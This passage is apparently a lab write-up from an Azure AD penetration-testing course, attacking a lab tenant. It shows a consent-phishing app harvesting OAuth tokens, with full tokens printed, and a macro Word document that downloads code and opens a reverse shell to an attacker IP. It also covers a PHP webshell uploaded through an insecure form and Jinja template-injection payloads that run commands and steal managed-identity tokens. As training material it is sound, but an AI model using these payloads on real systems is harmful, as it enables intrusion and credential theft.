$Token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6Im1hNlBrQkZIblNSQkFfRmZlTGJ1TFF6VUVkWGVzeGpIWUpibUozSlpwN1UiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3MjI2NiwibmJmIjoxNjE5ODcyMjY2LCJleHAiOjE2MTk4NzYxNjYsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkFTUUEyLzhUQUFBQWNDR0hIYWt5dVZlVHhnUDNnRklXdzZhM3MydVdUUHlGSUpVZjRNdVg0TVk9IiwiYW1yIjpbInB3ZCJdLCJhcHBfZGlzcGxheW5hbWUiOiJzdHVkZW50MTkwLWFwcCIsImFwcGlkIjoiMmVjMmYwN2UtNWE4My00MTEwLTg4NTktZDRkNWExNGJhZDJlIiwiYXBwaWRhY3IiOiIxIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6IkVyaWsgTS4gS2VsbGVyIiwib2lkIjoiNGQxZDk5M2ItNmY1MC00ZDViLWFkODgtYWM0YzI2MjQzYTY2IiwicGxhdGYiOiIzIiwicHVpZCI6IjEwMDMyMDAxMjBENkZGODYiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dG43d3dpNkRXaEJCaUZuVTFhRkxyUzV3QUs0LiIsInNjcCI6IlVzZXIuUmVhZCBVc2VyLlJlYWRCYXNpYy5BbGwiLCJzaWduaW5fc3RhdGUiOlsiaW5rbm93bm50d2siXSwic3ViIjoiUk81UTFUMXh0ejFyYlZNMEFuNG5hcjZIWXd3VUV3eEM5QnlIdmJfNnJ0MCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiRXJpa01LZWxsZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6IkVyaWtNS2VsbGVyQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJPX0ctWDZkOEVVaVFCOHh0R2dwVUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.JExDfzGEVDBilHfR9hVa1_2THrBk28yRj68uXEhlRpUtixCgO1VFR9h_0A_IlV0xfYkStkk4BzLuJbNkqrePfxhlYHDv5N9QsA9xdpiK5GyKUBUFNTlRnm5fe24CIIR9MPBsOz16RXe2qHf_YKOBw9pDge2MwBLzdJu8J4ZZ_r7L3VIpg3-fPA5yD3PA_3nY3RmXS9yTn_CHCCcezBCTQz1vI7TUc-998xvVDOMcmOqwM4pSfVU7UDC6eTfgvWaAr7q-1ekGWFBhoLB2HJ24ntw-Jf45AGYlcDCs2QXcjK43uK4GXCP9mFuyLA03XpCeTuIS3WOo39tjcRAjYQpY_g '

$URI = 'https://graph.microsoft.com/v1.0/users/'

$RequestParams = @{
  Method     = 'GET'
  Uri        = $URI
  Headers    = @{
    'Authorization' = "Bearer $Token"
  }
}
(Invoke-RestMethod @RequestParams).value | ft displayName, jobTitle, userPrincipalName
```

![picture 16](images/7ac8ef70f282a33df73e77a6504ea6db42baba303cb018d19714e1f2470d667a.png)  

<br/>

### Get admin consent

To summarize the previous attack, we made a malicious app which requires some AD permissions (`User.Read` and `User.ReadBasic.All`). To get more permissions, our app should require more permissions; note some permissions requires Admin Consent.

Based on the users enumeration, `markdwalden@defcorphq.onmicrosoft.com` is a good target since **Application Administrator** is assigned.

First modify the API permissions to add:
- `mail.read`
- `notes.read.all`
- `mailboxsettings.readwrite`
- `files.readwrite.all`
- `mail.send`

![picture 17](images/04029d9f25a3df88cb50c3ea1b41d427082a577b8d615242a8a3ee9dee9d330e.png)  

<br/>

Then email the link to the target user `markdwalden@defcorphq.onmicrosoft.com`:

![picture 18](images/d42fda5d0573d86d515129d556b9ddbc20693c8367ed94de5905fd195dd9a2f9.png)  


<br/>

The victim checks in:

![picture 19](images/4efc83fa8ea942322c20b73fa09e6da3d9a90185e4f4a37f87f3b3d3071fd63e.png)  

Then on http://localhost:82/365-Stealer/yourVictims/?dir=.%2FMarkDWalden%40defcorphq.onmicrosoft.com, we can see the tokens:

![picture 20](images/11832eda293bf94eadfdc6fa2862eec27c593487d1fbceb8a88c4611b73fc6b5.png)  

The access token:

```
eyJ0eXAiOiJKV1QiLCJub25jZSI6InI0RFM2NlB3cEk5WVFSRzhHNmNSakxyNTZWaHlnMXVLRkdjYktUSy1BbE0iLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3OTQ3NCwibmJmIjoxNjE5ODc5NDc0LCJleHAiOjE2MTk4ODMzNzQsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkUyWmdZTkJKeTlDNUdSOHZydmR2Ym16b3duMVRyeSsvOWtKdVhsMlIvTnJvT1pMT0VXY0IiLCJhbXIiOlsicHdkIl0sImFwcF9kaXNwbGF5bmFtZSI6InN0dWRlbnQxOTAtYXBwIiwiYXBwaWQiOiIyZWMyZjA3ZS01YTgzLTQxMTAtODg1OS1kNGQ1YTE0YmFkMmUiLCJhcHBpZGFjciI6IjEiLCJpZHR5cCI6InVzZXIiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiTWFyayBELiBXYWxkZW4iLCJvaWQiOiJmNjZlMTMzYy1iZDAxLTRiMGItYjNiNy03Y2Q5NDlmZDQ1ZjMiLCJwbGF0ZiI6IjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ0Q0U0QiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bjd3d2k2RFdoQkJpRm5VMWFGTHJTNXdBQ2MuIiwic2NwIjoiRmlsZXMuUmVhZFdyaXRlLkFsbCBNYWlsLlJlYWQgTWFpbC5TZW5kIE1haWxib3hTZXR0aW5ncy5SZWFkV3JpdGUgTm90ZXMuUmVhZC5BbGwgVXNlci5SZWFkIFVzZXIuUmVhZEJhc2ljLkFsbCIsInNpZ25pbl9zdGF0ZSI6WyJpbmtub3dubnR3ayJdLCJzdWIiOiJfUXlRMXJtLWRxeGh4TlAxYnhibFlzcXI4bTROTVQ2LWtSY2tzLVBTMTdzIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidW5pcXVlX25hbWUiOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXBuIjoiTWFya0RXYWxkZW5AZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInV0aSI6IkNIdFVveTdtNmtPTDRZSDZXN21NQWciLCJ2ZXIiOiIxLjAiLCJ3aWRzIjpbIjliODk1ZDkyLTJjZDMtNDRjNy05ZDAyLWE2YWMyZDVlYTVjMyIsImI3OWZiZjRkLTNlZjktNDY4OS04MTQzLTc2YjE5NGU4NTUwOSJdLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.TGKLDxkkJr-64k0RB8FIkD6gJCF2O3R03vtmTlIuCQs3ED3X0_QU4Fk9kNJh_r8MLQTq_HLazKQsGnQLZcV41vsuo3xvlJzwXdEZ9oWoaNmz_L9HpY7e4gq4K88FkXenSXcVJc8zKAhvbaotcyA4Bc2YRJV3xRv0vwjHnzD-1f07V2QwJACFZek4ag1Fqxt_3xiS7RugCXOc0OOqb-tRVc0kOHIA8ayKl9cNoDcdD_oAOhcMVLdALEdwTNXQ-iyoowFn3_FyUsKjTEXxbJa_LeO8Dd_9Tmm5wb7jLVNr_w_jjbhjDKXjPUM7p5m2AihdrfI0qGDWqWIVXHdu0W3F9w 
```

<br/>

### Weaponized Word file to reverse shell

We have the `files.readwrite.all` permission; it is possible to upload files on the user (`markdwalden@defcorphq.onmicrosoft.com`) drive.

Access the machine which has a licensed MS Word:

```
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("office-vm\administrator", $passwd); $officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds; Enter-PSSession -Session $officeVM
```

![picture 21](images/10bbeec1635204d12c521a7c98708027c1ca320171ee24e3cd1fa3e8a0ff3358.png)  

<br/>

Copy `Out-Word.ps1` to `C:\xampp\htdocs` and in the MSWord client:

```
iex (New-Object Net.WebClient).DownloadString("http://172.16.152.190:82/Out-Word.ps1")
```

![picture 22](images/cdc6ac76366a9aee5e0b22f70e2048890d2b89745aa32295eeec00f5eb38cb49.png)  

<br/>

Then generate a Word document with the following payload:

```
Out-Word -Payload "powershell iex (New-Object Net.WebClient).DownloadString('http://172.16.152.190:82/Invoke-PowerShellTcp.ps1'); Reverse -Reverse -IPAddress 172.16.152.190 -Port 4444" -OutputFile student190.doc; dir student190.doc
```

![picture 23](images/300ef2685eb4639acfe7d66eaf83f1b5631b4a48147f0c62354adb855ef5436b.png)  

<br/>

Copy the generated doc file to the local machine:

```
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student190.doc -Destination C:\AzAD\Tools\student190.doc
```

Also copy `Invoke-PowerShellTcp.ps1` to `C:\xampp\htdocs\Invoke-PowerShellTcp.ps1`.

<br/>

Launch a netcat listener on port 4444:

```
C:\AzAD\Tools\netcat-win32-1.12\nc.exe -lvp 4444
```

Then use 365-Stealer to upload the weaponized Word file to Mark's OneDrive:

```
cd C:\xampp\htdocs\365-Stealer\; &'C:\Program Files\Python38\python.exe' C:\xampp\htdocs\365-Stealer\365-Stealer.py --upload C:\AzAD\Tools\student190.doc --token-path C:\xampp\htdocs\365-Stealer\yourVictims\MarkDWalden@defcorphq.onmicrosoft.com\access_token.txt
```

![picture 24](images/923eeda468cd4b186b5ace3f87f464b386ff068318fe0548f20b2d67fe75b6ee.png)  

<br/>

A reverse shell calls back:

![picture 25](images/a57e241a358e4b7747d3f63d32c4abc9388aead27e62d203d4b16998999f54f4.png)  

<br/>

---

## Objective 10: App Service Abuse - Insecured File Upload

**Question**

The career app in the defcorphq tenant allows insecure file upload functionality. 

1. Abuse the vulnerability and compromise the app service.
2. Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.

<br/>

**Answer**

### Abuse the file upload vulnerability

Browse https://defcorphqcareer.azurewebsites.net/, there is a file upload function:

![picture 27](images/4b9e8aae4dd4a95c5ccd3cceb63856ac22a36b4b068b50023fe7b3336d82e706.png)  

<br/>

Try to upload a webshell:

```
<?php 

system($_REQUEST['cmd']);

?>
```

![picture 28](images/d2260fcd442c2b4cf4179a43bb34255df7839dd58abe2630b22e2f3d4bdda511.png)  

![picture 29](images/c7e2cfb4f3dd2f8804d3d55140bce452dd388fe36098d4a20b7524ba6bbc2eb7.png)  

As shown, the file upload is successful.

<br/>

Also upload the shell for getting a token:

```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

![picture 30](images/1c7cc4a175b31ce83f33a788d85d41369dd6be6794d977044129baf9cb248f5b.png)  

<br/>

Try to use the webshell (note the `uploads` directory is by guessing):

- https://defcorphqcareer.azurewebsites.net/uploads/student190shell.phtml?cmd=whoami

![picture 31](images/c185f2a881256dab364afba3b58c3558775a9bc9e2926b417c9d57fc72226162.png)  

As shown, the webshell runs successfully.

<br/>

Then try to get the token:

- https://defcorphqcareer.azurewebsites.net/uploads/student190token.phtml

![picture 32](images/dcf9b37fef52084897b375d65d553657ec9177c38ff579438561e7ef527a669a.png)  

As shown the access token is obtained from the metadata service.

```

{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4NjcyMjgsIm5iZiI6MTYxOTg2NzIyOCwiZXhwIjoxNjE5OTUzOTI4LCJhaW8iOiJFMlpnWU1qWVdDblBVSHFNUjZyUGFvS1FrNGd6QUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiVWpGRGd5dG1rRXlvVDlyOWNaVnFBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.S2lFIE_c71wQY6aFymVBshH_UwKIGr1CjVJUz187nZsvOia6AeUUSfv9tgRgMGwPHXetiYS1kDV6qHK-3ef3WpwIpYzrURcMLIXr9zDc_OZZCL4gqjPVfiRj3GOc4m9Sob_lmWrbli8T4lxDYQ9m3l_BN8tYAJSTgcAiBlvKkzdreOXJwv5KTR2UHa4s1bElgtvozrqx7NBNNhBKlMaZLd4gKQzobjQHVpv-ZLE4ohAT4h39tFgAWk9UzirHXsCWjcVpTPUPs1kJ0piw13s0ghu64jucX9Q0TdYHz1DDwgTWRyb4FsFkzY6cAMVRtLH29JRTN1Zu4hTC6SSR1V459w","expires_on":"05/02/2021 11:12:07 +00:00","resource":"https://management.azure.com/","token_type":"Bearer","client_id":"064aaf57-30af-41f0-840a-0e21ed149946"}
```

<br/>

Then we can check the resource available to the managed identity:

```
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2MTk4NjcyMjgsIm5iZiI6MTYxOTg2NzIyOCwiZXhwIjoxNjE5OTUzOTI4LCJhaW8iOiJFMlpnWU1qWVdDblBVSHFNUjZyUGFvS1FrNGd6QUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsIm9pZCI6ImNjNjdjOTBkLWQ5ZTktNDBkMi1iNTExLTlkNTJkNjc2ODJhYiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0bGV2U2dhdk1QQkJoQW9PSWUwVW1VWndBQUEuIiwic3ViIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiVWpGRGd5dG1rRXlvVDlyOWNaVnFBZyIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2I0MTM4MjZmLTEwOGQtNDA0OS04YzExLWQ1MmQ1ZDM4ODc2OC9yZXNvdXJjZWdyb3Vwcy9FbmdpbmVlcmluZy9wcm92aWRlcnMvTWljcm9zb2Z0LldlYi9zaXRlcy9kZWZjb3JwaHFjYXJlZXIiLCJ4bXNfdGNkdCI6MTYxNTM3NTYyOX0.S2lFIE_c71wQY6aFymVBshH_UwKIGr1CjVJUz187nZsvOia6AeUUSfv9tgRgMGwPHXetiYS1kDV6qHK-3ef3WpwIpYzrURcMLIXr9zDc_OZZCL4gqjPVfiRj3GOc4m9Sob_lmWrbli8T4lxDYQ9m3l_BN8tYAJSTgcAiBlvKkzdreOXJwv5KTR2UHa4s1bElgtvozrqx7NBNNhBKlMaZLd4gKQzobjQHVpv-ZLE4ohAT4h39tFgAWk9UzirHXsCWjcVpTPUPs1kJ0piw13s0ghu64jucX9Q0TdYHz1DDwgTWRyb4FsFkzY6cAMVRtLH29JRTN1Zu4hTC6SSR1V459w'
$clientid = '064aaf57-30af-41f0-840a-0e21ed149946'

Connect-AzAccount -AccessToken $token -AccountId $clientid; Get-AzResource | fl Name, ResourceGroupName, ResourceType, ResourceId
```

![picture 34](images/aa5d85f49383a7c95651fcb678f0924075fb2597fab27cb027edd25b45cbc977.png)  

```
Name              : bkpadconnect
ResourceGroupName : Engineering
ResourceType      : Microsoft.Compute/virtualMachines
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect

Name              : bkpadconnect/MDE.Windows
ResourceGroupName : ENGINEERING
ResourceType      : Microsoft.Compute/virtualMachines/extensions
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/ENGINEERING/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MDE.Windows

Name              : bkpadconnect/MicrosoftMonitoringAgent
ResourceGroupName : Engineering
ResourceType      : Microsoft.Compute/virtualMachines/extensions
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MicrosoftMonito
                    ringAgent

Name              : bkpadconnect368
ResourceGroupName : Engineering
ResourceType      : Microsoft.Network/networkInterfaces
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/networkInterfaces/bkpadconnect368

Name              : bkpadconnectIP
ResourceGroupName : Engineering
ResourceType      : Microsoft.Network/publicIPAddresses
ResourceId        : /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Network/publicIPAddresses/bkpadconnectIP
```

<br/>

To check the permissions of the managed identity against the available resources:

1. bkpadconnet

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 35](images/a63325b86ed71cd7f72534a6603b984c8257da0e908d9cab76abd115d3e37841.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

2. bkpadconnect/MDE.Windows

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/ENGINEERING/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MDE.Windows/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 36](images/20e9261cfbb1a5584570359d4eb11e928cdb30937925d73584dfe989221d77b2.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

3. bkpadconnect/MicrosoftMonitoringAgent

```
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/bkpadconnect/extensions/MicrosoftMonito/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'

$RequestParams = @{ 
    Method = 'GET' 
    Uri = $URI
    Headers = @{ 
        'Authorization' = "Bearer $Token"
    }
} 

(Invoke-RestMethod @RequestParams).value
```

![picture 37](images/c7d6086572f294006037841b1b40a2af924ab2a3767bca3813991ac55668b3f1.png)  

- `*/read`
- `Microsoft.Compute/virtualMachines/runCommand/action`

<br/>

...

<br/>

---

## Objective 11: App Service Abuse - Server-side Template Injection

**Questions**

1. An application in the defcorphq tenant is vulnerable to SSTI. Find the application and compromise the app service. 
2. Check if the service principal for the managed identity of the compromised app service has any interesting permissions on other Azure resources.

<br/>

**Answer**

Note we have the following webapp enumerated:

1. processfile.azurewebsites.net
2. vaultfrontend.azurewebsites.net

<br/>

Checking vaultfrontend.azurewebsites.net, there is a field to supply an email address:

![picture 38](images/ffe9a60894e19ee0c73885f5787dfdf3342012e60655c07de0a6ed8080ea7523.png)  

<br/>

Try to inject an expression and see if it is evaluated:

- `{{ 7 * 7 }}`

![picture 39](images/341657179af73e8eb3d8c49b0e8205b93973f01826edb9f335c84278513921f3.png)  

As shown, the expression has been evaluated.

<br/>

The way expression is evaluated means that, most probably, either PHP or Python is used for the web app. We may need to run some trial and error methods to find out the exact language and template framework.

By using `{{ config.items() }}`, we can see many configuration value:

![picture 40](images/6b6a81e28475d3a6993520cb9cf9d7f8f80905a8afa77d1a3c1ed5d66ff5fb57.png)  

The result shows that it is using Flask framework (python). Flask uses Jinja as its template engine. 

<br/>

To run command, we need to find a way to use `Popen`. To find the subclass that can call `Popen`, list all the classes using `mro` (Method Resolution order):

```
{{ ().__class__.__mro__[1].__subclasses__() }}
```

![picture 41](images/220d4488349b458722b87b14c033c6addf0bb9443df59d7286597c9dce47a3eb.png)  

<br/>

To find the right index of `Popen`, loop through all the classes and call the correct one:

```
{% for x in ().__class__.__mro__[1].__subclasses__() %}{% if "Popen" in x.__name__ %} {{x('whoami',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
```

![picture 42](images/2c666b071784827b082d885becdf828b8d471330d882db76a9d292fd3a17ddf1.png)  

As shown, the webapp (container / instance) runs as the root user.

<br/>

Check the environment variables using `env` and look for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT`:

```
{% for x in ().__class__.__mro__[1].__subclasses__() %}{% if "Popen" in x.__name__ %} {{x('env',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
```

Result:
```
×Purchase link has been sent to (b"FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0PLATFORM_VERSION=93.0.7.60HOSTNAME=947b2cf29d6fWEBSITE_INSTANCE_ID=fbfb3d40666b51d6bcc6b672f6e9ccc9bb5116dcaa2286b7104c9e799668fb61APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0\nIDENTITY_HEADER=34eb6ae7-0a00-4cc6-899d-5bedc3f41ed6\nSHLVL=0\nHOME=/root\nPORT=8000\nWEBSITE_RESOURCE_GROUP=research\nOLDPWD=/home/site/wwwroot\nORYX_ENV_TYPE=AppService\nDIAGNOSTIC_LOGS_MOUNT_PATH=/var/log/diagnosticLogs\nScmType=None\nPS1=(antenv) # \nREMOTEDEBUGGINGVERSION=16.0.30709.132\nLC_CTYPE=C.UTF-8\nWEBSITE_HOSTNAME=vaultfrontend.azurewebsites.net\nWEBSITE_STACK=PYTHON\nWEBSITE_AUTH_LOGOUT_PATH=/.auth/logout\nORYX_ENV_NAME=vaultfrontend\nWEBSITE_ROLE_INSTANCE_ID=0\nAPPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132\nWEBSITE_AUTH_ENCRYPTION_KEY=86B143FA8988D9C70F612040B901AF77EA700368A07F1C835AE7DCD8A986ACED\nAPPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout\nSERVER_SOFTWARE=gunicorn/20.0.4\nWEBSITE_SITE_NAME=vaultfrontend\nHOME_SITE=/home/site/wwwroot\nPATH=/tmp/8d8f8ee88aca199/antenv/bin:/opt/python/3.8.6/bin:/opt/python/3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nWEBSITE_AUTH_AUTO_AAD=False\nAPP_PATH=/tmp/8d8f8ee88aca199\nAPPSETTING_WEBSITE_SITE_NAME=vaultfrontend\nMSI_ENDPOINT=http://172.16.2.3:8081/msi/token\nWEBSITE_AUTH_ENABLED=False\nMSI_SECRET=34eb6ae7-0a00-4cc6-899d-5bedc3f41ed6\nAPPSETTING_WEBSITE_AUTH_AUTO_AAD=False\nAPPSETTING_WEBSITE_AUTH_ENABLED=False\nHOST=0.0.0.0\nWEBSITE_OWNER_NAME=b413826f-108d-4049-8c11-d52d5d388768+Research-GermanyWestCentralwebspace\nPYTHON_VERSION=3.8\nVIRTUAL_ENV=/tmp/8d8f8ee88aca199/antenv\nIDENTITY_ENDPOINT=http://172.16.2.3:8081/msi/token\nPWD=/tmp/8d8f8ee88aca199\nCOMPUTERNAME=lw0mdlwk00000B\nAPPSVC_RUN_ZIP=FALSE\nGUNICORN_CMD_ARGS=--timeout 600 --access-logfile - --error-logfile - --chdir=/tmp/8d8f8ee88aca199\nPYTHONPATH=:/tmp/8d8f8ee88aca199/antenv/lib/python3.8/site-packages\nSSH_PORT=2222\nAPPSETTING_ScmType=None\nORYX_AI_INSTRUMENTATION_KEY=4aadba6b-30c8-42db-9b93-024d5c62b887\nWEBSITE_AUTH_SIGNING_KEY=EBA28F1E0480B7F16F911751DAD1A2EDA1335521DA2966EF89A50BAA648B953A\nWEBSITE_SKU=Basic\n", None)
```

- `IDENTITY_HEADER`:  34eb6ae7-0a00-4cc6-899d-5bedc3f41ed6
- `IDENTITY_ENDPOINT`:  http://172.16.2.3:8081/msi/token

This proves it is using managed identity.

<br/>

Request the access token for the managed identity:

```
{% for x in ().__class__.__mro__[1].__subclasses__() %}{% if "Popen" in x.__name__ %} {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}
```

![picture 43](images/d666e4a150108d051c42db4dbb3764177c63d13e142487df6863a7372a547700.png)  

Result:

```
